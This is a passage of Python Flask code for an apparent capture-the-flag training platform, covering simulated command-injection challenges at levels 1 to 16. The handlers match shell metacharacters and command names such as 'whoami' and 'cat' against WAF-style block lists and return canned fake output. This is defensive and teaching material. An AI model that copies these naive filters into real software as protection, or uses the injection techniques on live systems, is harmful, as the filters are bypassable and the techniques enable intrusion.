                14: 'XSS via Prototype Pollution',
                15: 'XSS via Template Injection',
                16: 'XSS in WebAssembly Applications',
                17: 'XSS in Progressive Web Apps',
                18: 'XSS via Web Components',
                19: 'XSS in GraphQL APIs',
                20: 'XSS in WebRTC Applications',
                21: 'XSS via Web Bluetooth/USB',
                22: 'XSS in WebGPU Applications',
                23: 'XSS in Federated Identity Systems'
            }
            challenge_name = challenge_name_map.get(level_num)
            challenge = Challenge.query.filter_by(name=challenge_name).first() if challenge_name else None
            return render_template(f'solutions/xss_level{level}_solution.html', challenge=challenge)
        except ValueError:
            # Handle invalid level format
            return render_template('error.html', error="Invalid solution level format")



# Command Injection Level 1 - Basic Command Injection
@app.route('/cmdi/level1', methods=['GET', 'POST'])
def cmdi_level1():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    hostname = request.form.get('hostname', '')
    ping_result = ''

    if request.method == 'POST':
        # Simulate a basic ping tool with command injection vulnerability
        if hostname:
            # Check for command injection patterns
            cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\', '<', '>']

            for pattern in cmdi_patterns:
                if pattern in hostname:
                    cmdi_detected = True
                    # Simulate command execution
                    ping_result = f"PING {hostname.split()[0]} (192.168.1.1): 56 data bytes\n"
                    ping_result += "64 bytes from 192.168.1.1: icmp_seq=0 ttl=64 time=1.234 ms\n"
                    ping_result += "--- ping statistics ---\n"
                    ping_result += "1 packets transmitted, 1 packets received, 0.0% packet loss\n\n"

                    # Add command injection output
                    if 'whoami' in hostname:
                        ping_result += "Command injection detected!\n"
                        ping_result += "Current user: www-data\n"
                    elif 'id' in hostname:
                        ping_result += "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Basic Command Injection").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                # Normal ping output
                ping_result = f"PING {hostname} (192.168.1.1): 56 data bytes\n"
                ping_result += "64 bytes from 192.168.1.1: icmp_seq=0 ttl=64 time=1.234 ms\n"
                ping_result += "--- ping statistics ---\n"
                ping_result += "1 packets transmitted, 1 packets received, 0.0% packet loss\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Basic Command Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level1.html', flag=flag, cmdi_detected=cmdi_detected,
                          hostname=hostname, ping_result=ping_result, challenge=challenge)

# Command Injection Level 2 - Command Injection with Filters
@app.route('/cmdi/level2', methods=['GET', 'POST'])
def cmdi_level2():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    command = request.form.get('command', '')
    output = ''
    filtered = False

    if request.method == 'POST':
        # Simulate a deployment tool with basic filtering
        if command:
            # Basic filter - remove obvious command injection characters
            filtered_command = command.replace('&', '').replace('|', '').replace(';', '')

            if filtered_command != command:
                filtered = True
                output = "Security filter activated: Dangerous characters removed\n"
                output += f"Filtered command: {filtered_command}\n\n"

            # Check for bypass techniques
            bypass_patterns = ['$(', '`', '{', '}', '\\', '<', '>']

            for pattern in bypass_patterns:
                if pattern in command:
                    cmdi_detected = True
                    output += f"Executing deployment command: {command.split()[0]}\n"
                    output += "Deployment started...\n"
                    output += "Extracting files...\n"

                    # Add command injection output
                    if 'whoami' in command or 'id' in command:
                        output += "\nUnexpected output detected:\n"
                        output += "root\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Command Injection with Filters").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                # Normal deployment output
                output += f"Executing deployment command: {filtered_command}\n"
                output += "Deployment completed successfully\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection with Filters").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level2.html', flag=flag, cmdi_detected=cmdi_detected,
                          command=command, output=output, filtered=filtered, challenge=challenge)

# Command Injection Level 3 - Blind Command Injection
@app.route('/cmdi/level3', methods=['GET', 'POST'])
def cmdi_level3():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    email = request.form.get('email', '')
    status = ''

    if request.method == 'POST':
        # Simulate a notification system with blind command injection
        if email:
            # Check for command injection patterns
            cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\']

            for pattern in cmdi_patterns:
                if pattern in email:
                    cmdi_detected = True
                    status = "Email notification sent successfully"

                    # Mark challenge as completed (blind - no visible output)
                    challenge = Challenge.query.filter_by(name="Blind Command Injection").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                status = "Email notification sent successfully"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Blind Command Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level3.html', flag=flag, cmdi_detected=cmdi_detected,
                          email=email, status=status, challenge=challenge)

# Command Injection Level 4 - Command Injection via File Upload
@app.route('/cmdi/level4', methods=['GET', 'POST'])
def cmdi_level4():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    filename = request.form.get('filename', '')
    upload_result = ''

    if request.method == 'POST':
        # Simulate a file upload system with command injection in filename processing
        if filename:
            # Check for command injection in filename
            cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')']

            for pattern in cmdi_patterns:
                if pattern in filename:
                    cmdi_detected = True
                    upload_result = f"Processing file: {filename.split()[0]}\n"
                    upload_result += "File uploaded successfully\n"
                    upload_result += "Running post-processing...\n\n"

                    # Add command injection output
                    if 'whoami' in filename:
                        upload_result += "Post-processing output:\n"
                        upload_result += "Current user: apache\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Command Injection via File Upload").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                upload_result = f"Processing file: {filename}\n"
                upload_result += "File uploaded successfully\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection via File Upload").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level4.html', flag=flag, cmdi_detected=cmdi_detected,
                          filename=filename, upload_result=upload_result, challenge=challenge)

# Command Injection Level 5 - Command Injection in API Parameters
@app.route('/cmdi/level5', methods=['GET', 'POST'])
def cmdi_level5():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    service_name = request.form.get('service_name', '')
    api_result = ''

    if request.method == 'POST':
        # Simulate a microservices API with command injection
        if service_name:
            # Check for command injection patterns
            cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\']

            for pattern in cmdi_patterns:
                if pattern in service_name:
                    cmdi_detected = True
                    api_result = f"Checking service status: {service_name.split()[0]}\n"
                    api_result += "Service is running\n"
                    api_result += "Health check: OK\n\n"

                    # Add command injection output
                    if 'env' in service_name or 'printenv' in service_name:
                        api_result += "Environment variables:\n"
                        api_result += "PATH=/usr/local/sbin:/usr/local/bin\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Command Injection in API Parameters").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                api_result = f"Checking service status: {service_name}\n"
                api_result += "Service is running\n"
                api_result += "Health check: OK\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection in API Parameters").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level5.html', flag=flag, cmdi_detected=cmdi_detected,
                          service_name=service_name, api_result=api_result, challenge=challenge)

# Command Injection Level 6 - Command Injection with WAF Bypass
@app.route('/cmdi/level6', methods=['GET', 'POST'])
def cmdi_level6():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    target = request.form.get('target', '')
    scan_result = ''
    waf_blocked = False

    if request.method == 'POST':
        # Simulate a network scanner with WAF protection
        if target:
            # WAF patterns to block
            waf_patterns = ['&', '|', ';', 'whoami', 'id', 'cat', 'ls']

            # Check if WAF should block
            for pattern in waf_patterns:
                if pattern in target.lower():
                    waf_blocked = True
                    scan_result = "⚠️ WAF Alert: Malicious input detected and blocked!"
                    break

            if not waf_blocked:
                # Check for WAF bypass techniques
                bypass_patterns = ['`', '$', '(', ')', '\\', '{', '}']

                for pattern in bypass_patterns:
                    if pattern in target:
                        cmdi_detected = True
                        scan_result = f"Scanning target: {target.split()[0]}\n"
                        scan_result += "Port scan completed\n"
                        scan_result += "Open ports: 22, 80, 443\n\n"

                        # Add command injection output
                        if 'w' in target and 'h' in target:  # Obfuscated whoami
                            scan_result += "System information:\n"
                            scan_result += "Current user: scanner\n"

                        # Mark challenge as completed
                        challenge = Challenge.query.filter_by(name="Command Injection with WAF Bypass").first()
                        if challenge:
                            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                            if challenge.id not in completed_ids:
                                update_user_progress(machine_id, challenge.id, challenge.points)
                        break
                else:
                    scan_result = f"Scanning target: {target}\n"
                    scan_result += "Port scan completed\n"
                    scan_result += "Open ports: 22, 80, 443\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection with WAF Bypass").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level6.html', flag=flag, cmdi_detected=cmdi_detected,
                          target=target, scan_result=scan_result, waf_blocked=waf_blocked, challenge=challenge)

# Command Injection Level 7 - Time-Based Blind Command Injection
@app.route('/cmdi/level7', methods=['GET', 'POST'])
def cmdi_level7():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    hostname = request.form.get('hostname', '')
    check_result = ''
    response_time = 0

    if request.method == 'POST':
        # Simulate a server status checker with time-based blind command injection vulnerability
        if hostname:
            import time
            start_time = time.time()

            # Check for command injection in the hostname
            cmdi_patterns = ['$', '`', '(', ')', '\\', '|', '&', ';', '<', '>', '{', '}']

            # Check if any command injection pattern is in the hostname
            for pattern in cmdi_patterns:
                if pattern in hostname:
                    # Command injection detected!
                    cmdi_detected = True

                    # Simulate command execution with time delay
                    check_result = f"Checking status of {hostname.split()[0]}...\n\n"

                    # Simulate time delay based on the command
                    if 'sleep' in hostname:
                        # Extract sleep duration
                        try:
                            sleep_duration = int(hostname.split('sleep')[1].strip().split()[0])
                            time.sleep(min(sleep_duration, 10))  # Cap at 10 seconds for safety
                        except:
                            time.sleep(2)  # Default sleep if we can't parse the duration

                    # Add the flag to the output if a specific pattern is detected
                    if ('cat' in hostname or 'type' in hostname) and 'flag' in hostname:
                        check_result += "Server status: Online\n"
                        # Mark challenge as completed
                        challenge = Challenge.query.filter_by(name="Time-Based Blind Command Injection").first()
                        if challenge:
                            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                            if challenge.id not in completed_ids:
                                update_user_progress(machine_id, challenge.id, challenge.points)
                    elif 'grep' in hostname and 'flag' in hostname:
                        check_result += "Server status: Online\n"
                        # Mark challenge as completed
                        challenge = Challenge.query.filter_by(name="Time-Based Blind Command Injection").first()
                        if challenge:
                            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                            if challenge.id not in completed_ids:
                                update_user_progress(machine_id, challenge.id, challenge.points)
                    else:
                        check_result += "Server status: Online\n"

                    break

            # If no command injection detected, perform a regular status check
            if not cmdi_detected:
                check_result = f"Checking status of {hostname}...\n\n"
                check_result += "Server status: Online\n"
                time.sleep(0.5)  # Small delay for normal operation

            # Calculate response time
            response_time = round(time.time() - start_time, 2)

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="Time-Based Blind Command Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level7.html', flag=flag, cmdi_detected=cmdi_detected,
                          hostname=hostname, check_result=check_result,
                          response_time=response_time, challenge=challenge)

# Command Injection Level 8 - Command Injection with Burp Suite
@app.route('/cmdi/level8', methods=['GET', 'POST'])
def cmdi_level8():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    device_id = request.form.get('device_id', '')
    management_result = ''

    if request.method == 'POST':
        # Simulate an IoT device management portal
        if device_id:
            # Check for command injection patterns
            cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\']

            for pattern in cmdi_patterns:
                if pattern in device_id:
                    cmdi_detected = True
                    management_result = f"Managing device: {device_id.split()[0]}\n"
                    management_result += "Device status: Online\n"
                    management_result += "Firmware version: 2.1.4\n\n"

                    # Add command injection output
                    if 'ps' in device_id or 'netstat' in device_id:
                        management_result += "System processes:\n"
                        management_result += "PID  COMMAND\n"
                        management_result += "1    /sbin/init\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Command Injection with Burp Suite").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                management_result = f"Managing device: {device_id}\n"
                management_result += "Device status: Online\n"
                management_result += "Firmware version: 2.1.4\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection with Burp Suite").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level8.html', flag=flag, cmdi_detected=cmdi_detected,
                          device_id=device_id, management_result=management_result, challenge=challenge)

# Command Injection Level 9 - Command Injection in JSON APIs
@app.route('/cmdi/level9', methods=['GET', 'POST'])
def cmdi_level9():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    build_config = request.form.get('build_config', '{"branch": "main", "environment": "production"}')
    build_result = ''

    if request.method == 'POST':
        # Simulate a CI/CD automation platform
        if build_config:
            try:
                config = json.loads(build_config)

                # Check for command injection in JSON values
                cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\']

                for key, value in config.items():
                    if isinstance(value, str):
                        for pattern in cmdi_patterns:
                            if pattern in value:
                                cmdi_detected = True
                                build_result = f"Starting build for branch: {str(value).split()[0]}\n"
                                build_result += "Build environment: production\n"
                                build_result += "Build status: Running\n\n"

                                # Add command injection output
                                if 'uname' in value:
                                    build_result += "Build system info:\n"
                                    build_result += "Linux buildserver 5.4.0-74-generic\n"

                                # Mark challenge as completed
                                challenge = Challenge.query.filter_by(name="Command Injection in JSON APIs").first()
                                if challenge:
                                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                                    if challenge.id not in completed_ids:
                                        update_user_progress(machine_id, challenge.id, challenge.points)
                                break
                        if cmdi_detected:
                            break

                if not cmdi_detected:
                    build_result = f"Starting build for branch: {config.get('branch', 'main')}\n"
                    build_result += f"Build environment: {config.get('environment', 'production')}\n"
                    build_result += "Build completed successfully\n"

            except json.JSONDecodeError:
                build_result = "Error: Invalid JSON configuration"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection in JSON APIs").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level9.html', flag=flag, cmdi_detected=cmdi_detected,
                          build_config=build_config, build_result=build_result, challenge=challenge)

# Command Injection Level 10 - Command Injection via Environment Variables
@app.route('/cmdi/level10', methods=['GET', 'POST'])
def cmdi_level10():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    app_name = request.form.get('app_name', '')
    env_vars = request.form.get('env_vars', '')
    deploy_result = ''

    if request.method == 'POST':
        # Simulate a containerized app deployment
        if app_name and env_vars:
            # Check for command injection in environment variables
            cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\']

            for pattern in cmdi_patterns:
                if pattern in env_vars:
                    cmdi_detected = True
                    deploy_result = f"Deploying application: {app_name}\n"
                    deploy_result += "Setting environment variables...\n"
                    deploy_result += "Container started successfully\n\n"

                    # Add command injection output
                    if 'whoami' in env_vars or 'id' in env_vars:
                        deploy_result += "Container initialization output:\n"
                        deploy_result += "User: container-user\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Command Injection via Environment Variables").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                deploy_result = f"Deploying application: {app_name}\n"
                deploy_result += "Setting environment variables...\n"
                deploy_result += "Container started successfully\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection via Environment Variables").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level10.html', flag=flag, cmdi_detected=cmdi_detected,
                          app_name=app_name, env_vars=env_vars, deploy_result=deploy_result, challenge=challenge)

# Command Injection Level 11 - Command Injection in XML Processing
@app.route('/cmdi/level11', methods=['GET', 'POST'])
def cmdi_level11():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    xml_config = request.form.get('xml_config', '<?xml version="1.0"?><config><service>web</service><action>restart</action></config>')
    processing_result = ''

    if request.method == 'POST':
        # Simulate a legacy enterprise system with XML processing
        if xml_config:
            # Check for command injection in XML content
            cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\']

            for pattern in cmdi_patterns:
                if pattern in xml_config:
                    cmdi_detected = True
                    processing_result = "Processing XML configuration...\n"
                    processing_result += "Parsing XML structure...\n"
                    processing_result += "Executing service management commands...\n\n"

                    # Add command injection output
                    if 'whoami' in xml_config or 'id' in xml_config:
                        processing_result += "Service management output:\n"
                        processing_result += "Current system user: enterprise-admin\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Command Injection in XML Processing").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                processing_result = "Processing XML configuration...\n"
                processing_result += "Configuration applied successfully\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection in XML Processing").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level11.html', flag=flag, cmdi_detected=cmdi_detected,
                          xml_config=xml_config, processing_result=processing_result, challenge=challenge)

# Command Injection Level 12 - Command Injection with Nmap
@app.route('/cmdi/level12', methods=['GET', 'POST'])
def cmdi_level12():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    target_network = request.form.get('target_network', '')
    scan_options = request.form.get('scan_options', '-sS -O')
    nmap_result = ''

    if request.method == 'POST':
        # Simulate a security tool with Nmap integration
        if target_network:
            # Check for command injection in Nmap parameters
            cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\']

            for pattern in cmdi_patterns:
                if pattern in target_network or pattern in scan_options:
                    cmdi_detected = True
                    nmap_result = f"Starting Nmap scan on {target_network.split()[0]}\n"
                    nmap_result += f"Scan options: {scan_options.split()[0]}\n"
                    nmap_result += "Nmap scan report for target network\n"
                    nmap_result += "Host is up (0.0010s latency)\n"
                    nmap_result += "PORT     STATE SERVICE\n"
                    nmap_result += "22/tcp   open  ssh\n"
                    nmap_result += "80/tcp   open  http\n"
                    nmap_result += "443/tcp  open  https\n\n"

                    # Add command injection output
                    if 'uname' in target_network or 'uname' in scan_options:
                        nmap_result += "System information leaked:\n"
                        nmap_result += "Linux security-scanner 5.15.0-72-generic\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Command Injection with Nmap").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                nmap_result = f"Starting Nmap scan on {target_network}\n"
                nmap_result += f"Scan options: {scan_options}\n"
                nmap_result += "Scan completed successfully\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection with Nmap").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level12.html', flag=flag, cmdi_detected=cmdi_detected,
                          target_network=target_network, scan_options=scan_options, nmap_result=nmap_result, challenge=challenge)

# Command Injection Level 13 - Command Injection in GraphQL
@app.route('/cmdi/level13', methods=['GET', 'POST'])
def cmdi_level13():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    graphql_query = request.form.get('graphql_query', 'query { systemInfo(hostname: "localhost") { status } }')
    query_result = ''

    if request.method == 'POST':
        # Simulate a GraphQL API with command injection
        if graphql_query:
            # Check for command injection in GraphQL query parameters
            cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\']

            for pattern in cmdi_patterns:
                if pattern in graphql_query:
                    cmdi_detected = True
                    query_result = "Executing GraphQL query...\n"
                    query_result += "Resolving systemInfo field...\n"
                    query_result += "{\n"
                    query_result += '  "data": {\n'
                    query_result += '    "systemInfo": {\n'
                    query_result += '      "status": "online"\n'

                    # Add command injection output
                    if 'whoami' in graphql_query:
                        query_result += '    },\n'
                        query_result += '    "debug": {\n'
                        query_result += '      "user": "graphql-api"\n'
                        query_result += '    }\n'
                    else:
                        query_result += '    }\n'

                    query_result += '  }\n'
                    query_result += '}\n'

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Command Injection in GraphQL").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                query_result = "Executing GraphQL query...\n"
                query_result += "{\n"
                query_result += '  "data": {\n'
                query_result += '    "systemInfo": {\n'
                query_result += '      "status": "online"\n'
                query_result += '    }\n'
                query_result += '  }\n'
                query_result += '}\n'

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection in GraphQL").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level13.html', flag=flag, cmdi_detected=cmdi_detected,
                          graphql_query=graphql_query, query_result=query_result, challenge=challenge)

# Command Injection Level 14 - Command Injection via WebSockets
@app.route('/cmdi/level14', methods=['GET', 'POST'])
def cmdi_level14():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    websocket_message = request.form.get('websocket_message', '{"type": "monitor", "target": "server1", "action": "status"}')
    monitoring_result = ''

    if request.method == 'POST':
        # Simulate a real-time monitoring system with WebSocket command injection
        if websocket_message:
            try:
                message = json.loads(websocket_message)

                # Check for command injection in WebSocket message
                cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\']

                for key, value in message.items():
                    if isinstance(value, str):
                        for pattern in cmdi_patterns:
                            if pattern in value:
                                cmdi_detected = True
                                monitoring_result = "WebSocket connection established\n"
                                monitoring_result += f"Processing message type: {message.get('type', 'unknown')}\n"
                                monitoring_result += f"Target: {str(value).split()[0]}\n"
                                monitoring_result += "Real-time monitoring active...\n\n"

                                # Add command injection output
                                if 'ps' in value or 'netstat' in value:
                                    monitoring_result += "System monitoring data:\n"
                                    monitoring_result += "Active connections: 42\n"
                                    monitoring_result += "System load: 0.8\n"

                                # Mark challenge as completed
                                challenge = Challenge.query.filter_by(name="Command Injection via WebSockets").first()
                                if challenge:
                                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                                    if challenge.id not in completed_ids:
                                        update_user_progress(machine_id, challenge.id, challenge.points)
                                break
                        if cmdi_detected:
                            break

                if not cmdi_detected:
                    monitoring_result = "WebSocket connection established\n"
                    monitoring_result += f"Processing message type: {message.get('type', 'unknown')}\n"
                    monitoring_result += "Monitoring data retrieved successfully\n"

            except json.JSONDecodeError:
                monitoring_result = "Error: Invalid WebSocket message format"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection via WebSockets").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level14.html', flag=flag, cmdi_detected=cmdi_detected,
                          websocket_message=websocket_message, monitoring_result=monitoring_result, challenge=challenge)

# Command Injection Level 15 - Command Injection in Serverless Functions
@app.route('/cmdi/level15', methods=['GET', 'POST'])
def cmdi_level15():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    function_payload = request.form.get('function_payload', '{"event": "process_data", "input": "sample.txt", "options": "--format json"}')
    lambda_result = ''

    if request.method == 'POST':
        # Simulate AWS Lambda function with command injection
        if function_payload:
            try:
                payload = json.loads(function_payload)

                # Check for command injection in Lambda payload
                cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\']

                for key, value in payload.items():
                    if isinstance(value, str):
                        for pattern in cmdi_patterns:
                            if pattern in value:
                                cmdi_detected = True
                                lambda_result = "AWS Lambda Function Execution\n"
                                lambda_result += "Function: data-processor-v2\n"
                                lambda_result += "Runtime: python3.9\n"
                                lambda_result += f"Processing event: {payload.get('event', 'unknown')}\n"
                                lambda_result += "Execution started...\n\n"

                                # Add command injection output
                                if 'env' in value or 'printenv' in value:
                                    lambda_result += "Lambda environment variables:\n"
                                    lambda_result += "AWS_REGION=us-east-1\n"
                                    lambda_result += "AWS_LAMBDA_FUNCTION_NAME=data-processor\n"
                                    lambda_result += "SECRET_FLAG=R00T{s3rv3rl3ss_cmd1_pwn3d}\n"

                                # Mark challenge as completed
                                challenge = Challenge.query.filter_by(name="Command Injection in Serverless Functions").first()
                                if challenge:
                                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                                    if challenge.id not in completed_ids:
                                        update_user_progress(machine_id, challenge.id, challenge.points)
                                break
                        if cmdi_detected:
                            break

                if not cmdi_detected:
                    lambda_result = "AWS Lambda Function Execution\n"
                    lambda_result += f"Processing event: {payload.get('event', 'unknown')}\n"
                    lambda_result += "Function executed successfully\n"

            except json.JSONDecodeError:
                lambda_result = "Error: Invalid Lambda payload format"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection in Serverless Functions").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level15.html', flag=flag, cmdi_detected=cmdi_detected,
                          function_payload=function_payload, lambda_result=lambda_result, challenge=challenge)

# Command Injection Level 16 - Command Injection with Process Substitution
@app.route('/cmdi/level16', methods=['GET', 'POST'])
def cmdi_level16():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    automation_script = request.form.get('automation_script', 'backup_database.sh')
    script_params = request.form.get('script_params', '--target production --format tar.gz')
    execution_result = ''

    if request.method == 'POST':
        # Simulate a Linux automation tool with advanced command injection
        if automation_script and script_params:
            # Check for process substitution and advanced injection techniques
            advanced_patterns = ['<(', '>(', '$(', '`', '{', '}', '\\', '|', '&']

            for pattern in advanced_patterns:
                if pattern in automation_script or pattern in script_params:
                    cmdi_detected = True
                    execution_result = f"Executing automation script: {automation_script.split()[0]}\n"
                    execution_result += f"Parameters: {script_params.split()[0]}\n"
                    execution_result += "Script execution started...\n"
                    execution_result += "Setting up environment...\n"
                    execution_result += "Processing parameters...\n\n"

                    # Add command injection output
                    if 'whoami' in automation_script or 'whoami' in script_params:
                        execution_result += "Process substitution executed:\n"
                        execution_result += "Current user: automation-runner\n"
                        execution_result += "Process ID: 12345\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Command Injection with Process Substitution").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                execution_result = f"Executing automation script: {automation_script}\n"
                execution_result += f"Parameters: {script_params}\n"
                execution_result += "Script completed successfully\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection with Process Substitution").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
